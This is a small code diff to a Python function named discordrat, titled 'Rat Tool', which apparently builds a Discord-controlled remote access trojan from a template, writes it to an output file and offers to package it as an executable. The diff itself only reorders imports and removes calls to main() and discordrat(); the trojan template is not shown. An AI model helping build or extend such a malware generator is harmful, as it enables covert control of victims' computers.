@@ -1,6 +1,11 @@
+import os
+import sys
+import time
+
 from colorama import Fore
-import time, sys, os
-from util.plugins.common import * 
+
+from util.plugins.common import *
+
 
 def discordrat():
     setTitle("Rat Tool")
@@ -600,7 +605,6 @@ client.run(token)""".replace("~~TOKENHERE~~'", tokenbot + "'; g = [" + guildid +
         print(f"""\n\n\n\nError writing file: {e}""")
         os.system(2)
         clear()
-        main()
 
     print(f"""\n\n\nFile has been correctly written to "output/{fileName}.py" """)
     convert = input(f"""Convert your script into an executable (Y/N) ? """)
@@ -633,6 +637,3 @@ client.run(token)""".replace("~~TOKENHERE~~'", tokenbot + "'; g = [" + guildid +
         input(f"Press ENTER to exit")
     else:
         input(f"Press ENTER to exit")
-    main()
-
-discordrat()
